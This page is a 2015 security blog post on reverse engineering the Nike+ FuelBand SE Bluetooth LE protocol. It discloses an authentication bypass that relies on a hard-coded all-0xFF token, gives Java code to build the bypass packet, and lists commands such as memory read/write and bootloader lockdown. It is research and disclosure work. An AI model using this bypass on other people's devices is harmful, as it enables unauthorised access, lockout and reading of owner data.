<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>Nike+ FuelBand SE BLE Protocol Reversed | evilsocket</title>
<meta name="description" content="During the last two weeks I had fun playing with the BLE protocol of the Nike+ FuelBand SE, a device to track daily steps, calories, time, etc.
">


  <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml">


<link rel="icon" href="/images/favicon.ico">

<!-- Open Graph -->
<meta property="og:type" content="article">
<meta property="og:title" content="Nike+ FuelBand SE BLE Protocol Reversed">
<meta property="og:description" content="During the last two weeks I had fun playing with the BLE protocol of the Nike+ FuelBand SE, a device to track daily steps, calories, time, etc.
">
<meta property="og:url" content="/2015/01/29/Nike-FuelBand-SE-BLE-Protocol-Reversed/">
<meta property="og:site_name" content="evilsocket">

  
  
    <meta property="og:image" content="/images/2015/Jan/nikeband.jpg">
  


<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Nike+ FuelBand SE BLE Protocol Reversed">
<meta name="twitter:description" content="During the last two weeks I had fun playing with the BLE protocol of the Nike+ FuelBand SE, a device to track daily steps, calories, time, etc.
">

<!-- Schema.org JSON-LD -->

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://www.evilsocket.net/2015/01/29/Nike-FuelBand-SE-BLE-Protocol-Reversed/"
  },
  "headline": "Nike+ FuelBand SE BLE Protocol Reversed",
  "description": "During the last two weeks I had fun playing with the BLE protocol of the Nike+ FuelBand SE, a device to track daily steps, calories, time, etc.
",
  
  
  "image": "https://www.evilsocket.net/images/2015/Jan/nikeband.jpg",
  
  "datePublished": "2015-01-29T21:52:31.000Z",
  "dateModified": "2015-01-30T23:23:42.000Z",
  "author": {
    "@type": "Person",
    "name": "Simone Margaritelli",
    "url": "https://www.evilsocket.net",
    "sameAs": [
      "https://github.com/evilsocket",
      "https://twitter.com/evilsocket",
      "http://it.linkedin.com/in/simonemargaritelli/"
    ],
    "jobTitle": "Security Researcher",
    "worksFor": {
      "@type": "Organization",
      "name": "Independent"
    }
  },
  "publisher": {
    "@type": "Organization",
    "name": "evilsocket",
    "url": "https://www.evilsocket.net",
    "logo": {
      "@type": "ImageObject",
      "url": "https://www.evilsocket.net/images/glider.png"
    }
  },
  
  "keywords": "reversing, hacking, authentication, bluetooth, bluetooth low energy, nike, nike+ fuelband se, fuelband, nike fuelband, BLE, protocol, nikeband",
  
  "articleSection": "Technology",
  "inLanguage": "en"
}
</script>


<!-- Fonts -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<!-- Styles -->
<link rel="stylesheet" href="/css/style.css">


<!-- Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-22026549-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-22026549-1');
</script>


<meta name="generator" content="Hexo 5.4.2"></head>
<body class="post-page">
  <header class="site-header">
  <div class="header-inner">
    <div class="site-branding">
      <a href="/" class="site-logo">
        
          <img src="/images/glider.png" alt="evilsocket" width="50" height="50">
        
        <span class="site-title">evilsocket</span>
      </a>
    </div>
    
    <nav class="site-nav">
      
        <a href="/" class="nav-link">
          HOME
        </a>
      
        <a href="/atom.xml" class="nav-link">
          RSS
        </a>
      
    </nav>
  </div>
</header>

  
  <main class="main-content">
    <article class="post-full">
  <header class="post-header">
    <h1 class="post-title">Nike+ FuelBand SE BLE Protocol Reversed</h1>
    <div class="post-meta">
      BY <span class="post-author">Simone Margaritelli</span>
      — <time datetime="2015-01-29T21:52:31.000Z">29 Jan 2015</time>
      
        — <a href="/tags/reversing/" class="post-category">reversing</a>, <a href="/tags/hacking/" class="post-category">hacking</a>, <a href="/tags/authentication/" class="post-category">authentication</a>, <a href="/tags/bluetooth/" class="post-category">bluetooth</a>, <a href="/tags/bluetooth-low-energy/" class="post-category">bluetooth low energy</a>, <a href="/tags/nike/" class="post-category">nike</a>, <a href="/tags/nike-fuelband-se/" class="post-category">nike+ fuelband se</a>, <a href="/tags/fuelband/" class="post-category">fuelband</a>, <a href="/tags/nike-fuelband/" class="post-category">nike fuelband</a>, <a href="/tags/BLE/" class="post-category">BLE</a>, <a href="/tags/protocol/" class="post-category">protocol</a>, <a href="/tags/nikeband/" class="post-category">nikeband</a>
      
    </div>
  </header>

  
  
    <div class="post-cover">
      <img src="/images/2015/Jan/nikeband.jpg" alt="Nike+ FuelBand SE BLE Protocol Reversed">
    </div>
  

  <div class="post-content">
    <p>During the last two weeks I had fun playing with the <a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Bluetooth_low_energy">BLE</a> protocol of the <a target="_blank" rel="noopener" href="http://www.nike.com/us/en_us/c/nikeplus-fuelband">Nike+ FuelBand SE</a>, a device to track daily steps, calories, time, etc.</p>
<p><img src="/images/2015/Jan/nikeband.jpg" alt="nikeband"></p>
<span id="more"></span>

<p>I’ve completely reversed its protocol and found out the following key points:</p>
<ul>
<li><strong>The authentication system is vulnerable</strong>, anyone could connect to your device.</li>
<li>The protocol supports <strong>direct reading and writing of the device memory</strong>, up to 65K of contents.</li>
<li>The protocol supports commands that are not supposed to be implemented in a production release ( <strong>bootloader mode</strong>, device self test, etc ).</li>
</ul>
<p>I’ve published a <a target="_blank" rel="noopener" href="https://github.com/evilsocket/nikeplus-fuelband-se-reversed">proof of concept Android application on github</a>, don’t expect it to be production ready code of course, but it works :)</p>
<p><img src="/images/2015/Jan/Schermata-2015-01-29-alle-20-53-25.png" alt="poc logcat"></p>
<h1 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h1><p>Because! I had fun reversing it, I hate closed source hardware protocols, and as long as I know I’m the first one to actually manage to do it, despite <a target="_blank" rel="noopener" href="http://hacknikefuelband.com/">many are trying</a> since the first version with no luck.  </p>
<p>Kudos to <a target="_blank" rel="noopener" href="https://twitter.com/tompohl">Tom Pohl</a> for being the first one to <a target="_blank" rel="noopener" href="http://tompohl.com/2012/05/16/hacking-the-nike-fuelband/">reverse and somehow hack</a> the HTTP API of the FuelBand and to <a target="_blank" rel="noopener" href="https://twitter.com/qDot">Kyle Machulis</a> for his reversing of the <a target="_blank" rel="noopener" href="https://github.com/qdot/libfuelband">FB USB protocol</a>. You rock guys!</p>
<pre><code>The question is never why, the question is always **how**.</code></pre>
<p><img src="/images/2015/Jan/gatto_guerra.jpg" alt="fucku"></p>
<h1 id="BLE"><a href="#BLE" class="headerlink" title="BLE"></a>BLE</h1><pre><code>The **B**luetooth **L**ow **E**nergy is a wireless personal area network technology
designed and marketed by the Bluetooth Special Interest Group aimed at novel applications
in the healthcare, fitness, beacons, **security** ( LOL, more on this later ), and home
entertainment industries. Compared to Classic Bluetooth, Bluetooth Smart is intended to
provide considerably reduced power consumption and cost while maintaining a similar
communication range.</code></pre>
<p>Basically it’s something that works on the bluetooth frequencies, but has very little in common to the classic bluetooth, mostly because the device protocol must be implemented by each vendor since there isn’t really a standard (yet?).  </p>
<p>Each device has its <strong>characteristics</strong> which basically are read/write channels (thing about them as sockets), while the writing method is only one, there are two modes of reading data, either you perform an active reading or you wait for the <code>onCharacteristicChanged</code> event and get the available data from the read channel.</p>
<p>The annoying part of this technology is <strong>synchronization</strong>, since read and write operations can not be performed simultaneously, instead each one needs the previous operation to be completed before being scheduled … <strong>event programming</strong> dudes!</p>
<p>That’s why you will find an event queue and a lot of sinchronization code in my PoC, not my fault :P</p>
<h1 id="How"><a href="#How" class="headerlink" title="How"></a>How</h1><p>Fortunately there’s a <a target="_blank" rel="noopener" href="https://play.google.com/store/apps/details?id=com.nike.fb">Nike official Android application</a> that I managed to reverse, since I don’t (actually <strong>didn’t</strong>, more on this later ) know smali, I used the lame method of converting the APK to a JAR package using the great <a target="_blank" rel="noopener" href="https://code.google.com/p/dex2jar/">dex2jar</a> tool and then <a target="_blank" rel="noopener" href="http://jd.benow.ca/">JD-Gui</a> to easily read the Java source code.</p>
<p>First thing first, the device is detected and recognized by its <strong>COMPANYCODE</strong> in the advertisment data ( <code>byte[] NIKE_COMPANY_CODE = &#123; 0, 120 &#125;</code> ), then a <strong>GATT</strong> service discovery is launched.</p>
<p>The main command service UUID is <code>83cdc410-31dd-11e2-81c1-0800200c9a66</code> and it has two characteristics:</p>
<ul>
<li>Command Channel (where you write commands) : <code>c7d25540-31dd-11e2-81c1-0800200c9a66</code></li>
<li>Response Channel (where you wait for responses) : <code>d36f33f0-31dd-11e2-81c1-0800200c9a66</code></li>
</ul>
<p>Once the client device attaches to these two channels, it enables notifications on the response one and the authentication procedure starts.</p>
<h1 id="How-the-Authentication-Procedure-Theoretically-Works"><a href="#How-the-Authentication-Procedure-Theoretically-Works" class="headerlink" title="How the Authentication Procedure Theoretically Works"></a>How the Authentication Procedure Theoretically Works</h1><p>I’m saying <strong>theoretically</strong> because that’s what some parts of the application suggest it <strong>should</strong> work, but actually I’ve found out that most of the authentication code is bypassed and some pretty funny constants are used :)</p>
<p>Everything starts with a <strong>PIN</strong>, a string that “someone” will send you (probably the Nike web api)  during the first login/setup with the device, this string is stored inside the XML file <code>/data/data/com.nike.fb/shared_prefs/profilePreferences.xml</code>, in my case its node is:</p>
<pre><code>...
&lt;string name=&quot;pin&quot;&gt;69AB8DA2-F7D6-497C-869D-493CCF8FE8BC&lt;/string&gt;
...</code></pre>
<p>The pin is then hashed with the <strong>MD5</strong> function and the first 6 bytes of the resulting hash are converted to hexadecimal, those 6 bytes will become the <strong>discovery_token</strong> stored in the same file:</p>
<pre><code>...
&lt;string name=&quot;discovery_token&quot;&gt;5E5E6F7A7FE2&lt;/string&gt;
...</code></pre>
<p>Every time the app finds the device and wants to connect with it, it sends the following <strong>START AUTHENTICATION</strong> command:</p>
<pre><code>0x90 0x0101 0x00 0x00 0x00 ....</code></pre>
<p><strong>0x90</strong> indicates that’s a <strong>SESSION</strong> command and its bits contains the sequence number, number of total packets in the transaction and packet index ( <a target="_blank" rel="noopener" href="https://github.com/evilsocket/nikeplus-fuelband-se-reversed/blob/master/src/com/evilsocket/blehacks/Packet.java">this</a> is the encoder ).</p>
<p><strong>0x0101</strong> are the bytes indicating the <strong>START AUTH</strong> command and all the <strong>0x00</strong> are zero bytes padding up to 19 bytes.</p>
<p>Once the app sends this packet, the device replies with a <strong>challenge response</strong> containing a 16 bytes long <strong>nonce</strong> buffer.</p>
<pre><code>0xC0 0x11 0x41 0xF495C98693075322225EB8B8A4D79B39</code></pre>
<ul>
<li><strong>0xC0</strong> Reply opcode ( SESSION protocol, 0 following packets, packet index 0, sequence number 4 ).</li>
<li><strong>0x11</strong> Following data size ( 16 of the nonce + 1 of 0x41 ).</li>
<li><strong>0x41</strong> Auth opcode <strong>OPCODE_AUTH_CHALLENGE</strong> ( namely: “Hey dude, I’m sending you the <strong>nonce</strong>! )</li>
<li><strong>0xF495C98693075322225EB8B8A4D79B39</strong> : The <strong>nonce</strong> itself.</li>
</ul>
<p>To succesfully authenticate to the device, you need to take this <strong>nonce</strong>, the previously discussed <strong>discovery_token</strong>, get a <strong>CRC32</strong> of them, truncate it to two bytes and send it back to the device, so the resulting packet would be something like:</p>
<pre><code>0xB0 0x0302 XX XX 0x00 0x00 ........</code></pre>
<ul>
<li><strong>0xB0</strong> : SESSION protocol, 0 following packets, packet index 0, sequence number 5.</li>
<li><strong>0x0302</strong> : Authentication request opcode.</li>
<li><strong>XX XX</strong> : The two bytes of the truncated CRC32.</li>
<li><strong>0x00 …</strong> : Zero padding up to 19 bytes.</li>
</ul>
<p>Sounds quite simple yet robust doesn’t it? Since you need both the <strong>pin</strong> ( which is probably linked to the user account ) and the <strong>nonce</strong> sent by the device, there’s no way you can remotely connect to a FuelBand unless you have physical access to the owner device or you have hacked his account and used it on your device to force the web api to send you back his pin.</p>
<p>Right? ….. <strong>WRONG</strong> ! :D</p>
<p><strong>NOTE</strong>: Besides what I’m about to write, the device is broadcasting the user discovery_token within its <strong>advertisment data</strong> ( the <strong>MANUDATA</strong> field ), so you could sniff it anyway … LOL!</p>
<p>I’ve been stucked a couple of days on this … I implemented everything in the right way, I was using my own <strong>discovery_token</strong>, succesfully initiated the connection to the device and got the <strong>nonce</strong>, CRC32’ed them together … and then I got an <strong>InvalidParameterException</strong> from the <a target="_blank" rel="noopener" href="https://github.com/evilsocket/nikeplus-fuelband-se-reversed/blob/master/src/com/evilsocket/blehacks/CopperheadCRC32.java#L42">class which was computing the CRC32 checksum</a> ( that I copied from the JD-GUI decompilation ) with the message:</p>
<pre><code>Length of data must be a multiple of 4</code></pre>
<p><strong>WTF DUDE?!</strong> How could the discovery_token, which is only 6 bytes long, have a size which is divisible by 4?!<br>So I tried to truncate it to 4 bytes, pad it, hash it … you say it!<br>Nothing was working.</p>
<p>So I decided that it was the time for me to learn to read and write in <strong>Smali</strong> ( took me a couple of hours, quite simple actually ).</p>
<p>I decompiled the APK again, this time using <a target="_blank" rel="noopener" href="https://code.google.com/p/android-apktool/">apktool</a> to get the smali code, injected some code of mine to make the application log the actual token it was using, recompiled it with apktool, signed it with <strong>signapk</strong> and reinstalled to my device.</p>
<p>I’ve modified the class <code>com.nike.nikerf.protocol.impl.CopperheadAuthenticationHandler</code>, adding the <strong>Smali</strong> code to log the token to its method <code>calculateChallengeResponse</code>.</p>
<p><strong>Original</strong> ( Java version )</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] mAuthToken;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">short</span> <span class="title">calculateChallengeResponse</span><span class="params">(<span class="keyword">byte</span>[] nonce)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CopperheadCRC32 crc32 = <span class="keyword">new</span> CopperheadCRC32();</span><br><span class="line">    crc32.update(nonce);</span><br><span class="line">    crc32.update(<span class="keyword">this</span>.mAuthToken);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">short</span>)(<span class="number">0xFFFF</span> &amp; crc32.getValue() ^ <span class="number">0xFFFF</span> &amp; crc32.getValue() &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Patched</strong> ( Java version )</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] mAuthToken;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">short</span> <span class="title">calculateChallengeResponse</span><span class="params">(<span class="keyword">byte</span>[] nonce)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CopperheadCRC32 crc32 = <span class="keyword">new</span> CopperheadCRC32();</span><br><span class="line">    crc32.update(nonce);</span><br><span class="line">    crc32.update(<span class="keyword">this</span>.mAuthToken);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.mAuthToken.length; ++i )&#123;</span><br><span class="line">        android.util.Log.w( <span class="string">&quot;HACK&quot;</span>, <span class="string">&quot;AUTH_TOKEN[&quot;</span> + i + <span class="string">&quot;] = &quot;</span> + String.format(<span class="string">&quot;%02X &quot;</span>, <span class="keyword">this</span>.mAuthToken[i] ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">short</span>)(<span class="number">0xFFFF</span> &amp; crc32.getValue() ^ <span class="number">0xFFFF</span> &amp; crc32.getValue() &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Guess what?</p>
<h1 id="How-the-Authentication-Procedure-Really-Works"><a href="#How-the-Authentication-Procedure-Really-Works" class="headerlink" title="How the Authentication Procedure Really Works"></a>How the Authentication Procedure Really Works</h1><pre><code>Fuck it, who fucking cares about that token anyway? Let&#39;s just use **0xff 0xff 0xff 0xff 0xff 0xff ....** !</code></pre>
<p><img src="/images/2015/Jan/major-facepalm.jpg" alt="facepalm"></p>
<p>Yeah … although the code is there and all the mechanism described in the previous section could be robust … they are just using a hard coded token of 0xff 0xff 0xff 0xff 0xff 0xff …. meaning that, anyonce who’s able to get the <strong>nonce</strong> from the device ( so anyone with a BLE capable Android smarphone since the device itself it’s sending it ) will be able to authenticate against your device and send any command … let me facepalm again ….</p>
<p>So basically here the code to create an authentication packet:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">CopperheadCRC32 crc = <span class="keyword">new</span> CopperheadCRC32();</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] auth_token = Utils.hexToBytes(<span class="string">&quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Create the response packet: 0xb0 0x03 0x02 [2 BYTES OF CRC] 0x00 ...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Packet resp_packet = <span class="keyword">new</span> Packet(<span class="number">19</span>);</span><br><span class="line"></span><br><span class="line">resp_packet.setProtocolLayer( CommandResponseOperation.ProtocolLayer.SESSION );</span><br><span class="line">resp_packet.setPacketCount(<span class="number">0</span>);</span><br><span class="line">resp_packet.setPacketIndex(<span class="number">0</span>);</span><br><span class="line">resp_packet.setSequenceNumber( challenge_packet.getSequenceNumber() + <span class="number">1</span> );</span><br><span class="line"></span><br><span class="line">ByteBuffer response = ByteBuffer.allocate(<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">response.put( (<span class="keyword">byte</span>)<span class="number">0x03</span> );</span><br><span class="line">response.put( (<span class="keyword">byte</span>)<span class="number">0x02</span> );</span><br><span class="line"></span><br><span class="line">crc.update(nonce);</span><br><span class="line">crc.update(auth_token);</span><br><span class="line"></span><br><span class="line"><span class="keyword">short</span> sum = (<span class="keyword">short</span>)((<span class="number">0xFFFF</span> &amp; crc.getValue()) ^ (<span class="number">0xFFFF</span> &amp; crc.getValue() &gt;&gt;&gt; <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">response.putShort(sum);</span><br><span class="line"></span><br><span class="line">resp_packet.setPayload( response.array() );</span><br></pre></td></tr></table></figure>

<p>And finally the device will reply with:</p>
<pre><code>0xE0 0x01 0x42 0x00000000000000000000000000000000</code></pre>
<ul>
<li><strong>0xE0</strong>: SESSION layer reply, bla bla bla.</li>
<li><strong>0x01</strong>: 1 byte of reply.</li>
<li><strong>0x42</strong>: Succesfully authenticated ( FUCK YEAH! )</li>
<li><strong>0x00..</strong>: Padding.</li>
</ul>
<h1 id="Sending-Commands"><a href="#Sending-Commands" class="headerlink" title="Sending Commands"></a>Sending Commands</h1><p>Once you’re succesfully authenticated, you can start sending command, each command has its own encoding standard, but the first three bytes are always:</p>
<ul>
<li><strong>protocol byte</strong>: SESSION or COMMAND constants + some bit hacking to set sequence number etc.</li>
<li><strong>length byte</strong>: Size of the following data.</li>
<li><strong>opcode</strong> : Code of the command:</li>
</ul>
<p>Each command ( and its encode ) is implemented inside the class <code>com.nike.nikerf.protocol.impl.NikeProtocolCoder_Copperhead</code>, for instance here’s the redacted implementation of <strong>Cmd_GenericMemoryBlock</strong> ( yeah -.- ):</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Cmd_GenericMemoryBlock</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_ADDRESS = <span class="number">65536</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MSG_ERR1 = <span class="string">&quot;Request packet does not contain all required fields&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MSG_ERR2 = <span class="string">&quot;Request fields contain invalid values&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MSG_ERR3 = <span class="string">&quot;Transaction already in progress&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MSG_ERR4 = <span class="string">&quot;Request does not belong to a transaction&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MSG_ERR5 = <span class="string">&quot;Failed to open a transaction&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MSG_ERR6 = <span class="string">&quot;Failed to close a transaction&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String MSG_ERR7 = <span class="string">&quot;I/O failed&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> SUBCMD_END_TRANSACTION = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> SUBCMD_READ_CHUNK = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> SUBCMD_START_READ = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> SUBCMD_START_WRITE = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span> SUBCMD_WRITE_CHUNK = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> NikeMessage <span class="title">decode</span><span class="params">(<span class="keyword">final</span> NikeTransaction nikeTransaction)</span> <span class="keyword">throws</span> ProtocolCoderException </span>&#123;</span><br><span class="line">        ... decode a response ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">encode</span><span class="params">(<span class="keyword">final</span> NikeTransaction nikeTransaction)</span> <span class="keyword">throws</span> ProtocolCoderException </span>&#123;</span><br><span class="line">        ... encode <span class="keyword">this</span> command ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">byte</span> <span class="title">getOpCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In my proof of concept application you will find the code to create and send <strong>Cmd_Settings_Get</strong> commands, retrieving some sample data such as <strong>BAND_COLOR</strong>, <strong>FUEL</strong> level, owner <strong>FIRST_NAME</strong> and device <strong>SERIAL_NUMBER</strong>.</p>
<h1 id="Commands-Lists"><a href="#Commands-Lists" class="headerlink" title="Commands Lists"></a>Commands Lists</h1><ul>
<li><strong>Cmd_BatteryState</strong>: Retrieve battery state.</li>
<li><strong>Cmd_Bootloader</strong>: Set the device to bootloader mode ( basically it locks down the device, the official app won’t work either … only resetting it with the usb cable will unlock it ).</li>
<li><strong>Cmd_DesktopData</strong>: ???</li>
<li><strong>Cmd_EventLog</strong>: Get device event log.</li>
<li><strong>Cmd_GenericMemoryBlock</strong>: Read or Write a memory address from 0 to 0xFFFF.</li>
<li><strong>Cmd_MetricNotificationIntervalUpdate</strong>: Set interval time to receive metrics update notifications.</li>
<li><strong>Cmd_Notification_Subscribe</strong>: Subscribe to the notification of a specific metric.</li>
<li><strong>Cmd_ProtocolVersion</strong>: Get device protocol version.</li>
<li><strong>Cmd_RTC</strong>: Configure the device real time clock.</li>
<li><strong>Cmd_Reset</strong>: Reset the device.</li>
<li><strong>Cmd_ResetStatus</strong>: Reset the user data.</li>
<li><strong>Cmd_SampleStore</strong>: Use the device memory to store a custom object (!!!).</li>
<li><strong>Cmd_SampleStoreAsync</strong>: Same, but async.</li>
<li><strong>Cmd_SelfTest</strong>: Perform a hardware self test and get the results.</li>
<li><strong>Cmd_Session_Ctrl</strong>: Login/Logout/Ping</li>
<li><strong>Cmd_Settings_Get</strong>: Get a setting value by its code.</li>
<li><strong>Cmd_Settings_Get_Activity_Stats</strong>: Get user activity statistics.</li>
<li><strong>Cmd_Settings_Get_Boolean</strong>: Get a boolean setting.</li>
<li><strong>Cmd_Settings_Get_Int</strong>: Get an integer setting.</li>
<li><strong>Cmd_Settings_Get_MoveReminder</strong>: Get a “move reminder” type setting.</li>
<li><strong>Cmd_Settings_Set</strong>: Set the value of a setting by its code.</li>
<li><strong>Cmd_Settings_Set_MoveReminder</strong>: Set a “movie reminder” setting.</li>
<li><strong>Cmd_UploadGraphic</strong>: Upload a bitmap to show on the device led screen ( a subclass of Cmd_GenericMemoryBlock ).</li>
<li><strong>Cmd_UploadGraphicsPack</strong>: ???</li>
<li><strong>Cmd_Version</strong>: Get device firmware version.</li>
</ul>
<h1 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h1><p>Altough the device does not contain sensitive data about the user, this is a good proof of concept on how a badly implemented BLE custom protocol could lead an attacker to compromise a device ( such as the <strong>BLE proximity sensor of an alarm</strong> :) ) without any kind of authentication or expensive hardware.</p>

  </div>

  
    <div class="post-tags">
      
        <a href="/tags/reversing/" class="tag">#reversing</a>
      
        <a href="/tags/hacking/" class="tag">#hacking</a>
      
        <a href="/tags/authentication/" class="tag">#authentication</a>
      
        <a href="/tags/bluetooth/" class="tag">#bluetooth</a>
      
        <a href="/tags/bluetooth-low-energy/" class="tag">#bluetooth low energy</a>
      
        <a href="/tags/nike/" class="tag">#nike</a>
      
        <a href="/tags/nike-fuelband-se/" class="tag">#nike+ fuelband se</a>
      
        <a href="/tags/fuelband/" class="tag">#fuelband</a>
      
        <a href="/tags/nike-fuelband/" class="tag">#nike fuelband</a>
      
        <a href="/tags/BLE/" class="tag">#BLE</a>
      
        <a href="/tags/protocol/" class="tag">#protocol</a>
      
        <a href="/tags/nikeband/" class="tag">#nikeband</a>
      
    </div>
  

  <nav class="post-navigation">
    
      <a href="/2015/02/01/Huawei-Modems-Authentication-Bypass/" class="nav-prev">
        <span class="nav-label">PREVIOUS</span>
        <span class="nav-title">Huawei Modems Authentication Bypass</span>
      </a>
    
    
      <a href="/2015/01/16/How-to-install-Metasploit-on-OS-X-Mavericks-and-Yosemite-an-Updated-Guide/" class="nav-next">
        <span class="nav-label">NEXT</span>
        <span class="nav-title">How to Install Metasploit on OS X Mavericks and Yosemite, an Updated Guide</span>
      </a>
    
  </nav>
</article>


  


<section class="related-posts">
  <h3 class="related-title">YOU MIGHT ALSO LIKE...</h3>
  <div class="cards-grid cards-grid-related">
    
      

<article class="card card-light">
  <a href="/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2024/cups1/smart.jpg')">
        
      </div>
    
    
    
      <div class="card-content">
        
          <span class="card-category">cups</span>
        
        <h2 class="card-title">Attacking UNIX Systems via CUPS, Part I</h2>
        
        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/" class="card-link">
    
